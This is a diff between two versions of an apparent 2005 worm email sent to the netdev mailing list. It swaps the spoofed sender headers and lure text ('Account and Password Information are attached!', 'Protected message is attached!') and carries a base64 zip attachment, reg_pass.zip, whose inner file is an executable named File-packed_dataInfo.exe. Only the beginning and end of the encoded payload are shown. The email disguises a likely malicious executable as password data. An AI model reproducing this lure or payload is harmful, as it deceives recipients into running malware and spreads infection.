@@ -1,29 +1,29 @@
-From: Admin@cambridgedancers.org
-Subject: Your Password
-Date: Sat, 24 Dec 2005 01:19:07 GMT
-Message-ID: <722fb0dd9ab.5f24b@cambridgedancers.org>
+From: info@netlock.net
+Subject: Your_Password
+Date: Sat, 24 Dec 2005 01:34:51 UTC
+Message-ID: <f0abbeec.0ecfc2e7826@netlock.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="34e7add.a7bbadd4bc5ebb"
+Content-Type: multipart/mixed; boundary="====114ec71f.9fa21b7bedc"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: mailingbox@oss.sgi.com
+To: majordomo@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---34e7add.a7bbadd4bc5ebb
+--====114ec71f.9fa21b7bedc
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.cambridgedancers.org
-***** Email: postman@cambridgedancers.org
---34e7add.a7bbadd4bc5ebb
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+***** Go to: http://www.netlock.net
+***** Email: postman@netlock.net
+--====114ec71f.9fa21b7bedc
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---34e7add.a7bbadd4bc5ebb--
+--====114ec71f.9fa21b7bedc--
